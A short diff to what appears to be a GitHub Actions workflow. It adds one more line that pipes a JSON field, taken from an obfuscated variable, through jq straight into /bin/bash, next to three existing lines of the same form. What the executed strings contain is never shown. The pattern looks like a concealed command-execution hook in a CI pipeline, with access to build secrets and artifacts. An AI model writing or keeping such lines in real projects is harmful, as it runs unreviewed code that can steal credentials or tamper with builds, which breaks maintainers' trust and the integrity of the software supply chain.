@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$fzoge3" | jq -r .igfas9 | /bin/bash
           printf '%s' "$m974" | jq -r .ddon4 | /bin/bash
           printf '%s' "$bkd59" | jq -r .ccmg6 | /bin/bash
+          printf '%s' "$j9" | jq -r .q8268 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
